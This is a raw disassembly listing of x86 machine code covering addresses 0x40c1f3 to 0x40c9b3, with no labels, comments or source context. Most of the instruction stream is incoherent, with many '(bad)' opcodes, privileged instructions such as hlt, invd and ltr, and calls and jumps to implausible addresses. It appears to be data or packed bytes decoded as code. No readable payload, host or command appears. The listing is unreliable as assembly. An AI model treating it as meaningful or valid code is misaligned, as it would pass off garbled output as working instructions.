  40c1f3:	rol    DWORD PTR [ecx],0x45
  40c1f6:	sbb    BYTE PTR [ecx+0x58bec45],al
  40c1fc:	cld    
  40c1fd:	clc    
  40c1fe:	pop    eax
  40c1ff:	pop    es
  40c200:	xor    eax,DWORD PTR [eax]
  40c202:	add    esp,DWORD PTR [esi-0x77]
  40c205:	inc    ebp
  40c206:	hlt    
  40c207:	mov    ebx,esi
  40c209:	or     BYTE PTR [ebp-0x7b0040],al
  40c20f:	add    ecx,DWORD PTR [ebx-0x14ba2800]
  40c215:	test   DWORD PTR [ebx-0x3e2b03f1],ecx
  40c21b:	add    dl,al
  40c21d:	mov    ecx,ecx
  40c21f:	sbb    BYTE PTR [eax],cl
  40c221:	rcl    BYTE PTR [ebp-0x7c],0xec
  40c225:	add    ebp,esp
  40c227:	add    bh,al
  40c229:	mov    edi,esp
  40c22b:	and    BYTE PTR [ebp+0x4500f842],al
  40c231:	data16 xor al,0xc1
  40c234:	pushf  
  40c235:	or     BYTE PTR [ebx+0x5666fc00],cl
  40c23b:	rcl    DWORD PTR [edi+0x4d],0x51
  40c23f:	xor    ax,WORD PTR [ecx]
  40c242:	mov    ebx,0x37285
  40c247:	add    bl,al
  40c249:	inc    ebp
  40c24a:	inc    ebp
  40c24b:	mov    ecx,DWORD PTR [ebx-0x39ba03f8]
  40c251:	add    eax,ebx
  40c253:	cmp    al,0x45
  40c255:	inc    ebp
  40c256:	push   edi
  40c257:	mov    edi,DWORD PTR [ebp+0x50]
  40c25a:	mov    eax,eax
  40c25c:	lock test BYTE PTR [ebp+0x3],cl
  40c260:	xor    eax,DWORD PTR [eax]
  40c262:	mov    DWORD PTR [ebp-0x10],eax
  40c265:	xor    eax,0x8b358c45
  40c26a:	pushf  
  40c26b:	aam    0x8b
  40c26d:	xabort 0xc3
  40c270:	dec    ebp
  40c271:	inc    ebp
  40c272:	xor    ecx,DWORD PTR [ebx-0x78070377]
  40c278:	inc    ebp
  40c279:	add    ebp,esi
  40c27b:	add    BYTE PTR [eax+ecx*1+0x3f4498b],bl
  40c282:	dec    ebp
  40c283:	mov    esi,DWORD PTR [ebx]
  40c285:	cld    
  40c286:	mov    DWORD PTR [edi+0x4501f4],eax
  40c28c:	xor    DWORD PTR [eax],edx
  40c28e:	pushf  
  40c28f:	dec    ebp
  40c290:	mov    ecx,DWORD PTR [ecx-0x2db2df14]
  40c296:	xor    esi,DWORD PTR [ebx]
  40c298:	mov    DWORD PTR [edi+0x4501ec],eax
  40c29e:	xor    eax,0xb8529f55
  40c2a3:	push   ebp
  40c2a4:	xchg   ebp,eax
  40c2a5:	xor    eax,DWORD PTR [eax]
  40c2a7:	add    ecx,DWORD PTR [ecx+0x45712052]
  40c2ad:	inc    DWORD PTR [ebp-0x20aff0e0]
  40c2b3:	mov    eax,DWORD PTR [eax]
  40c2b5:	in     al,0x8b
  40c2b7:	inc    ecx
  40c2b8:	or     al,0x8b
  40c2ba:	rcl    BYTE PTR [eax-0x7c],0xc8
  40c2be:	add    eax,DWORD PTR [ebp+0x0]
  40c2c1:	push   ecx
  40c2c2:	inc    ebp
  40c2c3:	call   0x4fcc4d
  40c2c8:	leave  
  40c2c9:	push   ebp
  40c2ca:	add    BYTE PTR [ebx+0x459466],cl
  40c2d0:	mov    ecx,0x8b8a89
  40c2d5:	or     al,0x33
  40c2d7:	jo     0x40c292
  40c2d9:	(bad)  
  40c2da:	cmp    ecx,DWORD PTR [eax]
  40c2dc:	add    al,ch
  40c2de:	add    eax,DWORD PTR [edi]
  40c2e0:	mov    eax,DWORD PTR [eax]
  40c2e2:	or     BYTE PTR [ebp+0x39],cl
  40c2e5:	mov    ecx,DWORD PTR [edi]
  40c2e7:	cmp    al,0xa9
  40c2e9:	rol    DWORD PTR [eax],0xb7
  40c2ec:	mov    edx,DWORD PTR [esp+edi*8]
  40c2ef:	dec    esp
  40c2f0:	dec    ebp
  40c2f1:	sbb    BYTE PTR [ebx+0x418b084d],cl
  40c2f7:	cld    
  40c2f8:	mov    DWORD PTR [edi-0x31bff9f4],esi
  40c2fe:	test   ebx,ecx
  40c300:	cmovne ecx,DWORD PTR [edi-0x38f0ffc5]
  40c307:	test   al,0xd4
  40c309:	add    BYTE PTR [ebp+0x45fcf88b],al
  40c30f:	into   
  40c310:	xor    ecx,ebx
  40c312:	add    ecx,DWORD PTR [ebp-0x77]
  40c315:	mov    edx,esp
  40c317:	fadd   QWORD PTR [ebp-0x49]
  40c31a:	mov    eax,DWORD PTR [esi]
  40c31c:	nop
  40c31d:	into   
  40c31e:	add    cl,dl
  40c320:	mov    edx,ebx
  40c322:	mov    edx,DWORD PTR [ebp+0x3c]
  40c325:	invd   
  40c327:	mov    BYTE PTR [ebp+0x0],al
  40c32a:	mov    ecx,DWORD PTR [ebx-0x3dffe774]
  40c330:	mov    ecx,DWORD PTR [ecx+0x3e41889]
  40c336:	push   ebp
  40c337:	push   ebp
  40c338:	cmp    ecx,DWORD PTR [ebx+0x488b3875]
  40c33e:	fmul   DWORD PTR [ecx+0x28dd000]
  40c344:	call   0xf8484f0a
  40c349:	rcl    esi,1
  40c34b:	rcl    ebx,0x45
  40c34e:	call   DWORD PTR [eax+0x50]
  40c351:	inc    edx
  40c352:	jne    0x40c357
  40c354:	jmp    DWORD PTR [eax]
  40c356:	sbb    al,0xe8
  40c358:	dec    ebp
  40c359:	or     BYTE PTR [ebx+0x49555400],cl
  40c35f:	mov    ebp,DWORD PTR [ebx]
  40c361:	sbb    BYTE PTR [ebx],al
  40c363:	dec    eax
  40c364:	and    BYTE PTR [ebx],dh
  40c366:	push   eax
  40c367:	add    edi,DWORD PTR [ebx]
  40c369:	cmp    eax,DWORD PTR [eax]
  40c36b:	je     0x40c2f8
  40c36d:	push   ecx
  40c36e:	and    BYTE PTR [ebp-0x79],cl
  40c371:	add    eax,DWORD PTR [ecx]
  40c373:	or     al,0x0
  40c375:	inc    eax
  40c376:	adc    BYTE PTR [ebx],al
  40c378:	inc    ebp
  40c379:	and    bh,bh
  40c37b:	push   eax
  40c37c:	push   esp
  40c37d:	sub    DWORD PTR [ebp+0x0],esi
  40c380:	push   edx
  40c381:	mov    ecx,eax
  40c383:	sbb    BYTE PTR [eax],al
  40c385:	dec    ebp
  40c386:	mov    ecx,DWORD PTR [ebx-0x3fbe1fe0]
  40c38c:	add    esi,DWORD PTR [ebx]
  40c38e:	jge    0x72cdcddc
  40c394:	add    DWORD PTR [eax],eax
  40c396:	mov    DWORD PTR [ebp+0x18],edx
  40c399:	mov    DWORD PTR [ebp+0x18],ecx
  40c39c:	cmovne edx,DWORD PTR [eax+0xf]
  40c3a0:	xor    edx,DWORD PTR [edx+0x3]
  40c3a3:	xor    ecx,DWORD PTR [ecx-0x2e74f3d5]
  40c3a9:	or     al,0x84
  40c3ab:	rol    DWORD PTR [eax],cl
  40c3ad:	dec    ebp
  40c3ae:	add    BYTE PTR [ebx],bh
  40c3b0:	dec    ebp
  40c3b1:	jbe    0x40c3e6
  40c3b3:	mov    eax,DWORD PTR [ebx]
  40c3b5:	cld    
  40c3b6:	mov    DWORD PTR [edi+0x4d01e0],edx
  40c3bc:	bswap  esi
  40c3be:	push   eax
  40c3bf:	retf   
  40c3c0:	xor    ecx,DWORD PTR [ebp+0x2b]
  40c3c3:	mov    ebp,DWORD PTR [ebx]
  40c3c5:	and    BYTE PTR [ecx],bh
  40c3c7:	or     ah,al
  40c3c9:	daa    
  40c3ca:	xchg   DWORD PTR [edi+0x100],eax
  40c3d0:	push   ebp
  40c3d1:	push   ebp
  40c3d2:	adc    DWORD PTR [edx+0x8],0x55
  40c3d6:	push   ebp
  40c3d7:	xor    ebp,ebx
  40c3d9:	add    ecx,DWORD PTR [ebx+0x40551852]
  40c3df:	dec    DWORD PTR [ebp+0x45ffff54]
  40c3e5:	sbb    al,0x8b
  40c3e7:	rol    BYTE PTR [ebp-0x8fe8b7c],0x0
  40c3ee:	and    eax,DWORD PTR [ebp+0x3]
  40c3f1:	mov    edx,eax
  40c3f3:	enter  0x8b,0x4
  40c3f7:	mov    eax,DWORD PTR [ebp+0x33]
  40c3fa:	push   eax
  40c3fb:	add    esp,DWORD PTR [edi-0x74f5fff1]
  40c401:	add    ah,bh
  40c403:	add    DWORD PTR [ebp-0x28],0xffffff8b
  40c407:	mov    eax,0xd64f08
  40c40c:	ror    DWORD PTR [ecx-0x3fe83b36],cl
  40c412:	mov    esp,DWORD PTR [esi+0x8]
  40c415:	inc    ebp
  40c416:	dec    eax
  40c417:	mov    eax,0x44f8b
  40c41c:	inc    ebp
  40c41d:	mov    DWORD PTR [ecx-0x38],edx
  40c420:	call   0xc3cbe5
  40c425:	or     BYTE PTR [ebp-0x75],al
  40c428:	mov    esp,DWORD PTR [esi-0x24]
  40c42b:	inc    ebp
  40c42c:	push   ebp
  40c42d:	mov    eax,0x284e83
  40c432:	into   
  40c433:	mov    DWORD PTR [edx+ecx*8-0x31cd7662],ecx
  40c43a:	mov    eax,DWORD PTR [ebp+0xc]
  40c43d:	lea    eax,[ebp+0x45]
  40c440:	mov    edi,DWORD PTR [ecx+0xb78adc]
  40c446:	push   es
  40c447:	xor    eax,esi
  40c449:	mov    edx,0x453bd0
  40c44e:	sub    eax,DWORD PTR [ebx]
  40c450:	mov    edi,edi
  40c452:	loopne 0x40c45c
  40c454:	retf   0x837d
  40c457:	push   es
  40c458:	dec    ebp
  40c459:	mov    DWORD PTR [ebx+0xc78c72],ecx
  40c45f:	lods   al,BYTE PTR ds:[esi]
  40c460:	xor    edx,eax
  40c462:	add    esi,DWORD PTR [edx]
  40c464:	mov    DWORD PTR [ebp+0x18],eax
  40c467:	xlat   BYTE PTR ds:[ebx]
  40c468:	dec    ebp
  40c469:	sar    BYTE PTR [ebx],1
  40c46b:	(bad)  
  40c46c:	jne    0x40c422
  40c46e:	mov    esp,eax
  40c470:	fsub   st,st(7)
  40c472:	add    BYTE PTR [ebp-0x73],al
  40c475:	xor    ch,al
  40c477:	out    dx,al
  40c478:	mov    eax,edi
  40c47a:	hlt    
  40c47b:	mov    esp,0xd3d3d0d6
  40c480:	mov    eax,edi
  40c482:	in     al,0xc0
  40c484:	jb     0x40c467
  40c486:	push   ecx
  40c487:	inc    ebp
  40c488:	push   eax
  40c489:	jl     0x40c410
  40c48b:	leave  
  40c48c:	cmove  esi,esp
  40c48f:	lods   al,BYTE PTR ds:[esi]
  40c490:	add    BYTE PTR [eax],dl
  40c492:	mov    esi,edx
  40c494:	or     al,0x80
  40c496:	(bad)  
  40c497:	xor    eax,0x83008801
  40c49c:	or     DWORD PTR [edi],edx
  40c49e:	into   
  40c49f:	in     al,dx
  40c4a0:	retf   
  40c4a1:	xchg   DWORD PTR [ecx+eax*1+0x4d000001],eax
  40c4a8:	gs push ecx
  40c4aa:	add    BYTE PTR [eax+0x24],dl
  40c4ad:	mov    eax,DWORD PTR [eax]
  40c4af:	fsub   DWORD PTR [esi+0x0]
  40c4b2:	inc    ebp
  40c4b3:	lea    eax,[ebx-0x76aff554]
  40c4b9:	push   ecx
  40c4ba:	(bad)  
  40c4bb:	lea    ebx,[esi]
  40c4bd:	fadd   DWORD PTR [eax]
  40c4bf:	mov    esp,DWORD PTR [esi-0x74]
  40c4c2:	inc    ebp
  40c4c3:	add    BYTE PTR [ebx+0x65ff08ff],al
  40c4c9:	mov    eax,DWORD PTR [eax]
  40c4cb:	fmul   st,st(0)
  40c4cd:	ror    BYTE PTR [ecx-0x45ba33c6],0xeb
  40c4d4:	add    BYTE PTR [ebx-0x27b2769a],cl
  40c4da:	inc    bp
  40c4dc:	inc    ebp
  40c4dd:	je     0x40c46a
  40c4df:	mov    ecx,DWORD PTR [eax]
  40c4e1:	sbb    BYTE PTR [edi+ecx*4-0x3c],al
  40c4e5:	add    DWORD PTR [edx+0x0],eax
  40c4e8:	add    BYTE PTR [ecx],dl
  40c4ea:	jmpw   0x14f6
  40c4ee:	or     BYTE PTR [ebx+0x668c00],cl
  40c4f4:	retf   0x453b
  40c4f7:	jne    0x40c47c
  40c4f9:	mov    ecx,DWORD PTR [eax]
  40c4fb:	in     al,0x66
  40c4fd:	(bad)
  40c501:	add    BYTE PTR [ebp+0x52],al
  40c504:	enter  0xee03,0x89
  40c508:	(bad)  
  40c509:	sbb    al,0xb0
  40c50b:	inc    ebp
  40c50c:	jmp    0xea20:0x45ff3357
  40c513:	and    dh,ch
  40c515:	inc    edi
  40c517:	test   DWORD PTR [eax+0x3fc3ed0f],edi
  40c51d:	add    BYTE PTR [ebp-0x1],al
  40c520:	ror    BYTE PTR [esi+ebp*8],1
  40c523:	(bad)  
  40c524:	data16 jne 0x40c56c
  40c527:	call   0x7bd0d
  40c52c:	ret    0x33c0
  40c52f:	test   BYTE PTR [ebp-0x75fff300],cl
  40c535:	inc    ebp
  40c536:	or     BYTE PTR [ebx-0x3015dfb7],0x41
  40c53d:	sub    BYTE PTR [eax],dl
  40c53f:	(bad)  
  40c540:	stc    
  40c541:	test   DWORD PTR [edx+0xf],esi
  40c544:	mov    ebx,DWORD PTR [ecx+0x570000d8]
  40c54a:	lea    esi,[ebp-0x3c]
  40c54d:	call   0xff45c051
  40c552:	pop    eax
  40c554:	add    DWORD PTR [eax+eax*1+0x52005500],eax
  40c55b:	xchg   edi,edi
  40c55d:	add    DWORD PTR [eax],ecx
  40c55f:	add    BYTE PTR [ebp+0x55],cl
  40c562:	push   ecx
  40c563:	cmp    ecx,DWORD PTR [edi+0x8b0175]
  40c569:	fdiv   DWORD PTR [ecx]
  40c56b:	add    al,dl
  40c56d:	lea    eax,[ebp-0x18]
  40c570:	test   edi,edi
  40c572:	je     0x40c55c
  40c574:	mov    DWORD PTR [ebp+0x8],ecx
  40c577:	dec    DWORD PTR [edx]
  40c579:	push   esp
  40c57a:	add    bh,bh
  40c57c:	inc    ebp
  40c57d:	sbb    al,0x3b
  40c57f:	push   ebp
  40c580:	or     BYTE PTR [ebx+0x50c80d],cl
  40c586:	mov    ecx,DWORD PTR [ebx+0x300338c]
  40c58c:	cmp    esi,DWORD PTR [ebp+esi*2-0x75]
  40c590:	mov    ecx,DWORD PTR [eax+ebx*1]
  40c593:	inc    ecx
  40c594:	pop    edi
  40c596:	add    DWORD PTR [eax],ecx
  40c598:	add    BYTE PTR [ebp+0x7511f811],ah
  40c59e:	push   ebp
  40c59f:	dec    DWORD PTR [ebx+0xf69014]
  40c5a5:	or     BYTE PTR [ebx+0x11752800],cl
  40c5ab:	adc    DWORD PTR [eax-0x62],0x660c008b
  40c5b2:	push   eax
  40c5b3:	jno    0x40c62a
  40c5b5:	add    ebp,eax
  40c5b7:	push   edx
  40c5b8:	clc    
  40c5b9:	sar    bh,1
  40c5bb:	xchg   eax,eax
  40c5bd:	add    DWORD PTR [eax+eax*1-0x7ff7b00],eax
  40c5c4:	jne    0x40c5d0
  40c5c6:	mov    eax,DWORD PTR [ebp-0x1]
  40c5c9:	mov    esp,DWORD PTR [eax]
  40c5cb:	sub    BYTE PTR [edx+eax*8-0x1],ah
  40c5cf:	rol    BYTE PTR [ebp-0x5174f0bb],1
  40c5d5:	loopne 0x40c5d7
  40c5d7:	dec    ebp
  40c5d8:	mov    ecx,DWORD PTR [ecx+0x1855c70c]
  40c5de:	mov    eax,DWORD PTR [eax]
  40c5e0:	call   0xffbebbe5
  40c5e5:	add    al,al
  40c5e7:	add    al,0x84
  40c5e9:	add    BYTE PTR gs:[eax],al
  40c5ec:	add    BYTE PTR [ebp-0x1],al
  40c5ef:	jmp    0x40c611
  40c5f1:	xor    ecx,eax
  40c5f3:	pop    edi
  40c5f4:	call   FWORD PTR [ebx-0x7b]
  40c5f7:	ret    0xf
  40c5fa:	mov    BYTE PTR [ebx+0x518b0f00],cl
  40c600:	mov    WORD PTR [edi],cs
  40c602:	add    BYTE PTR [ecx-0x75],al
  40c605:	push   ebx
  40c606:	and    BYTE PTR [ebx],dh
  40c608:	adc    BYTE PTR [ebp-0x7a78f7e6],cl
  40c60e:	add    DWORD PTR [eax+eax*1-0x75],esi
  40c612:	dec    ebp
  40c613:	or     al,0x51
  40c615:	sbb    al,0x75
  40c617:	cmp    DWORD PTR [ebx+0x710ce408],ecx
  40c61d:	pop    eax
  40c61e:	push   edx
  40c61f:	add    edx,DWORD PTR [eax+0x3]
  40c622:	mov    edi,DWORD PTR [ecx]
  40c624:	and    BYTE PTR [eax],cl
  40c626:	xchg   DWORD PTR [edx],ecx
  40c628:	add    eax,eax
  40c62a:	add    BYTE PTR [edi+0x0],al
  40c62d:	cli    
  40c62e:	(bad)  
  40c62f:	loope  0x40c5f4
  40c631:	shl    BYTE PTR [edi],0x5b
  40c634:	dec    ebp
  40c635:	ret    0x8b
  40c638:	sub    BYTE PTR [ebx+0x28358345],cl
  40c63e:	pushf  
  40c63f:	inc    ebp
  40c640:	mov    esi,DWORD PTR ds:0xc7759c08
  40c646:	and    esp,0xf8008557
  40c64c:	inc    DWORD PTR [ebp+0x10]
  40c64f:	xor    eax,esi
  40c651:	pushf  
  40c652:	jb     0x40c60c
  40c654:	add    BYTE PTR [edi+0x9],cl
  40c657:	add    BYTE PTR [esi],dl
  40c659:	mov    edx,eax
  40c65b:	hlt    
  40c65c:	inc    eax
  40c65e:	(bad)  
  40c65f:	data16 rol BYTE PTR [ebp+0x0],1
  40c663:	mov    eax,0x9c4f34
  40c668:	jmp    0x40c5f3
  40c66a:	mov    edi,eax
  40c66c:	or     al,0xc0
  40c66e:	inc    eax
  40c66f:	add    ax,WORD PTR [ebp-0x1]
  40c673:	mov    ecx,DWORD PTR [ecx+0x4545e008]
  40c679:	mov    ecx,DWORD PTR [ebx+0x1451c0c]
  40c67f:	mov    eax,DWORD PTR [ebp-0x10]
  40c682:	add    DWORD PTR [ecx+0x7830800],edi
  40c688:	sbb    cl,al
  40c68a:	jne    0x40c617
  40c68c:	sub    esp,0x20
  40c68f:	sahf   
  40c690:	mov    esi,DWORD PTR [edx]
  40c692:	and    BYTE PTR [ebx],al
  40c694:	add    dl,BYTE PTR [edi-0x40]
  40c697:	lock pop esi
  40c699:	test   cl,cl
  40c69b:	add    DWORD PTR [eax+eax*1],ebx
  40c69e:	push   ebp
  40c69f:	inc    ebp
  40c6a0:	in     al,dx
  40c6a1:	mov    esi,DWORD PTR [edi-0x483ef918]
  40c6a7:	ret    0xf014
  40c6aa:	push   edi
  40c6ab:	test   bh,bh
  40c6ad:	add    DWORD PTR [eax+eax*1+0x18],eax
  40c6b1:	inc    ebp
  40c6b2:	shl    BYTE PTR [ebx],cl
  40c6b4:	pop    ds
  40c6b5:	add    ecx,DWORD PTR [eax-0x77]
  40c6b8:	(bad)  
  40c6b9:	loopne 0x40c6ec
  40c6bb:	inc    ebp
  40c6bc:	pop    ebp
  40c6bd:	xor    esi,DWORD PTR [edx+0x3]
  40c6c0:	mov    ecx,DWORD PTR [ecx-0x482623f8]
  40c6c6:	fdivp  st(4),st
  40c6c8:	pop    ebp
  40c6c9:	mov    bh,0x72
  40c6cb:	hlt    
  40c6cc:	add    DWORD PTR [edx+0x28],0x0
  40c6d0:	cmp    esp,DWORD PTR [esi+0x72]
  40c6d3:	lock xor eax,DWORD PTR [edx+0x5f]
  40c6d7:	add    BYTE PTR [ebp+0x66],bl
  40c6da:	add    al,0xfb
  40c6dc:	push   ebp
  40c6dd:	or     ah,ch
  40c6df:	add    ah,ch
  40c6e1:	data16 (bad) 
  40c6e3:	lock lock add eax,DWORD PTR [ebp+0x4566f82b]
  40c6eb:	jge    0x40c721
  40c6ed:	mov    ebx,DWORD PTR [eax+eiz*8+0x66d87dc7]
  40c6f4:	test   DWORD PTR [eax+edi*8],esi
  40c6f7:	sbb    si,WORD PTR [ebp+0x0]
  40c6fb:	mov    esp,DWORD PTR [esi-0x24]
  40c6fe:	inc    ebp
  40c6ff:	jge    0x40c684
  40c701:	pushaw 
  40c703:	xor    al,0x89
  40c705:	data16 cld 
  40c707:	jne    0x40c739
  40c709:	mov    esi,0x667200
  40c70e:	inc    ebp
  40c70f:	or     BYTE PTR [ebx-0x76742000],al
  40c715:	lock clc 
  40c717:	mov    eax,DWORD PTR [ebp+0xc]
  40c71a:	mov    edi,esi
  40c71c:	in     al,dx
  40c71d:	or     BYTE PTR [ebp+0x0],al
  40c720:	mov    esi,edi
  40c722:	call   0x53500c62
  40c727:	sbb    dl,BYTE PTR [edi+0x0]
  40c72a:	push   ecx
  40c72b:	mov    esi,DWORD PTR [ebx]
  40c72d:	lock push esi
  40c72f:	pop    ebp
  40c730:	jne    0x40c765
  40c732:	mov    edx,0x3b7203
  40c737:	retw   0x3b7d
  40c73b:	minpd  xmm7,xmm0
  40c73f:	str    WORD PTR [ebp+0x66f0008b]
  40c746:	jne    0x40c727
  40c748:	xor    eax,DWORD PTR [ebx+eax*1+0xf003b00]
  40c74f:	mov    esp,esi
  40c751:	cld    
  40c752:	add    BYTE PTR [edx-0x75],al
  40c755:	add    al,dh
  40c757:	sar    bx,0xc2
  40c75b:	mov    eax,DWORD PTR [ebp+0x8]
  40c75e:	mov    eax,DWORD PTR [ebx]
  40c760:	lock rcr di,0xc2
  40c765:	es inc ebp
  40c767:	mov    ecx,DWORD PTR [edi]
  40c769:	clc    
  40c76a:	jne    0x40c7ae
  40c76c:	(bad)  
  40c76e:	jge    0x40c7d6
  40c770:	mov    eax,0x8b8afb
  40c775:	or     BYTE PTR [ebx],dh
  40c777:	add    edi,DWORD PTR [ebx+0xdf8a66]
  40c77d:	push   cs
  40c77e:	xor    esi,DWORD PTR [edi-0x48c4f748]
  40c784:	add    ah,dh
  40c786:	add    edi,ebx
  40c788:	mov    ax,di
  40c78b:	or     dh,bh
  40c78d:	mov    ecx,DWORD PTR [ecx+0x7542f4fc]
  40c793:	add    BYTE PTR [ebx-0x7404139a],cl
  40c799:	mov    esi,DWORD PTR [edi+0xc]
  40c79c:	mov    DWORD PTR [ebx],eax
  40c79e:	or     BYTE PTR [esi+0x75],ah
  40c7a1:	fisttp WORD PTR [ebx-0x747417da]
  40c7a7:	clc    
  40c7a8:	ja     0x40c7ec
  40c7aa:	mov    DWORD PTR [eax],eax
  40c7ac:	or     al,0x66
  40c7ae:	sahf   
  40c7af:	sti    
  40c7b0:	add    BYTE PTR [ebx+0x3010ce9],cl
  40c7b6:	add    BYTE PTR [esi+0x7d],ah
  40c7b9:	fbld   TBYTE PTR [esi+0xe]
  40c7bc:	pop    ebp
  40c7bd:	mov    bh,0x81
  40c7bf:	or     al,0x57
  40c7c1:	mov    bh,0x0
  40c7c3:	hlt    
  40c7c4:	add    edi,ebx
  40c7c6:	mov    di,bx
  40c7c9:	or     al,0x84
  40c7cb:	mov    eax,DWORD PTR [ecx]
  40c7cd:	or     al,0x0
  40c7cf:	mov    edi,DWORD PTR [ebp+0x8]
  40c7d2:	mov    edi,DWORD PTR [ebx]
  40c7d4:	adc    BYTE PTR [edi],cl
  40c7d6:	stc    
  40c7d7:	mov    ebx,0x8bdf00fa
  40c7dc:	mov    ebx,eax
  40c7de:	or     al,0x5d
  40c7e0:	mov    esi,DWORD PTR [ebx]
  40c7e2:	or     BYTE PTR [ebp+0x72001f84],cl
  40c7e8:	add    BYTE PTR [eax],al
  40c7ea:	cmp    edi,DWORD PTR [ebp+0xf]
  40c7ed:	mov    ecx,DWORD PTR [ebp+0x665d00d8]
  40c7f3:	xor    edi,DWORD PTR [ebp-0x73]
  40c7f6:	mov    ebx,0x728a1f
  40c7fb:	add    BYTE PTR [ebx],dh
  40c7fd:	jge    0x40c865
  40c7ff:	mov    ebx,DWORD PTR [ebp-0x20]
  40c802:	pop    bp
  40c804:	clc    
  40c805:	cmp    di,WORD PTR [edx+esi*2]
  40c809:	data16 data16 jge 0x40c88a
  40c80d:	mov    edi,DWORD PTR [ebx+0x5d8adc]
  40c813:	xor    di,WORD PTR [esi+eiz*2]
  40c817:	pop    bp
  40c819:	jge    0x40c881
  40c81b:	mov    edi,eax
  40c81d:	lock cmp ecx,DWORD PTR [ebx-0x8f0f789]
  40c824:	jge    0x40c82e
  40c826:	ltr    WORD PTR [ebp-0x2]
  40c82a:	add    edi,DWORD PTR [ebx]
  40c82c:	hsubpd xmm4,xmm0
  40c830:	data16 (bad) 
  40c832:	jge    0x40c7bf
  40c834:	mov    ebx,0xf18ae4
  40c839:	dec    ebp
  40c83a:	xor    eax,DWORD PTR [ebx]
  40c83c:	minpd  xmm6,xmm1
  40c840:	data16 jne 0x40c83b
  40c843:	jmp    0x40c880
  40c845:	mov    esi,DWORD PTR [edx-0x10]
  40c848:	sar    WORD PTR [ebp+0x4d],1
  40c84c:	mov    ebx,0xa8a8d
  40c851:	jb     0x40c886
  40c853:	add    BYTE PTR [esi+0x4d],ah
  40c856:	pop    ebp
  40c857:	mov    esp,DWORD PTR [esi-0x20]
  40c85a:	clc    
  40c85b:	jne    0x40c898
  40c85d:	data16 ja 0x40c894
  40c860:	jnp    0xf1502ee3
  40c866:	pop    ebp
  40c867:	inc    edx
  40c868:	add    eax,DWORD PTR [eax]
  40c86a:	data16 data16 jge 0x40c860
  40c86e:	mov    dx,0x7d
  40c872:	data16 pop bp
  40c875:	icebp  
  40c876:	sbb    di,bx
  40c879:	jne    0x40c800
  40c87b:	mov    eax,DWORD PTR [eax]
  40c87d:	call   0x77be5382
  40c882:	mov    ebp,DWORD PTR [ebx]
  40c884:	in     al,dx
  40c885:	data16 stc 
  40c887:	repnz mov esp,0x32759e3b
  40c88d:	xor    ecx,DWORD PTR [ecx+0x7d33eceb]
  40c893:	inc    eax
  40c894:	mov    eax,DWORD PTR [edi]
  40c896:	call   0xbc74c1e0
  40c89b:	add    ebx,DWORD PTR [esi-0x76a4cda1]
  40c8a1:	ret    0xe8
  40c8a4:	jge    0x40c831
  40c8a6:	mov    edx,DWORD PTR [ecx-0x14]
  40c8a9:	mov    ecx,DWORD PTR [ebx-0x76f784aa]
  40c8af:	add    BYTE PTR [eax],cl
  40c8b1:	data16 jge 0x40c882
  40c8b4:	mov    eax,DWORD PTR [edx-0x18]
  40c8b7:	add    BYTE PTR [ebx-0x7631849a],cl
  40c8bd:	mov    edx,0xc77d000c
  40c8c2:	data16 cld 
  40c8c4:	pop    ebp
  40c8c5:	test   DWORD PTR [ecx+0x3557f8],eax
  40c8cb:	pushf  
  40c8cc:	add    esp,DWORD PTR [esi+0x66]
  40c8cf:	into   
  40c8d0:	fistp  WORD PTR [ebp-0x7b]
  40c8d3:	push   edi
  40c8d4:	(bad)  
  40c8d5:	mov    bh,0xff
  40c8d7:	mov    edi,0xff338d75
  40c8dc:	mov    edx,DWORD PTR [edi-0x10]
  40c8df:	push   ecx
  40c8e0:	repnz mov ebx,0x894faf
  40c8e6:	lock cmp edx,DWORD PTR [edx]
  40c8e9:	jne    0x40c940
  40c8eb:	mov    DWORD PTR [ebx],esi
  40c8ed:	cld    
  40c8ee:	mov    edx,DWORD PTR [edi-0x1c]
  40c8f1:	xor    ecx,DWORD PTR [ebx+ecx*4+0x6632339e]
  40c8f8:	mov    DWORD PTR [esp+eiz*8-0x749baac4],ecx
  40c8ff:	mov    ebx,0x8b3bec
  40c904:	push   esi
  40c905:	sub    ecx,eax
  40c907:	mov    ebx,0xba8a2b
  40c90c:	mov    dh,BYTE PTR [ebx]
  40c90e:	add    BYTE PTR [ebx+0xb94e33],bh
  40c914:	dec    esi
  40c915:	cmp    eax,DWORD PTR [eax]
  40c917:	jne    0x40c954
  40c919:	mov    esi,DWORD PTR [ebp-0x4]
  40c91c:	mov    ebx,DWORD PTR [ebx-0x24]
  40c91f:	stc    
  40c920:	jge    0x40c8a7
  40c922:	data16 clc 
  40c924:	xor    al,0x9
  40c926:	data16 into 
  40c928:	lock test BYTE PTR [ebx],dh
  40c92b:	ds data16 fs icebp 
  40c92f:	pop    esi
  40c930:	add    al,0xc3
  40c932:	ror    BYTE PTR [ebx+0x57c0510c],0xeb
  40c939:	inc    ebp
  40c93a:	mov    esi,DWORD PTR [esi]
  40c93c:	in     al,0x9c
  40c93e:	sar    DWORD PTR [esi-0x7a17a3e],0xc9
  40c945:	pop    ebx
  40c946:	or     al,0xff
  40c948:	push   ebp
  40c949:	mov    ebp,esp
  40c94b:	mov    ah,BYTE PTR [esi+0x4]
  40c94e:	or     BYTE PTR [esi+edi*4],dh
  40c951:	cmp    al,0x3b
  40c953:	je     0x40c955
  40c955:	mov    ebp,DWORD PTR [ebx]
  40c957:	mov    edx,0xff8a8dbe
  40c95c:	add    BYTE PTR [edi+0x33],dl
  40c95f:	push   ecx
  40c960:	mov    esi,0x8b4e53
  40c965:	mov    ebx,0x363b45
  40c96a:	pushf  
  40c96b:	sub    edi,DWORD PTR [edx-0x7757a45]
  40c971:	add    BYTE PTR [ebx],bh
  40c973:	xor    esi,DWORD PTR [ebx+edi*4+0x53]
  40c977:	dec    edi
  40c978:	str    ecx
  40c97b:	cmp    esp,DWORD PTR [edx+0x75]
  40c97e:	int    0x89
  40c980:	mov    esi,0x77208fc
  40c985:	xor    edx,DWORD PTR [esi]
  40c987:	mov    eax,DWORD PTR [eax]
  40c989:	xor    esp,DWORD PTR [esi-0x73]
  40c98c:	retf   
  40c98d:	push   edi
  40c98e:	add    esp,ebp
  40c990:	push   ebp
  40c991:	add    BYTE PTR [ebp-0x293cfee8],cl
  40c997:	cmp    dl,0x49
  40c99a:	(bad)  
  40c99b:	sti    
  40c99c:	mov    esi,DWORD PTR [ebp+0x78]
  40c99f:	mov    esp,ebp
  40c9a1:	cld    
  40c9a2:	add    BYTE PTR ds:0xf8008508,bh
  40c9a8:	data16 or al,0xcb
  40c9ab:	rol    DWORD PTR [edx-0x37],0x0
  40c9af:	mov    DWORD PTR [esi+0x47],esp
  40c9b2:	retf   
  40c9b3:	in     eax,0xba
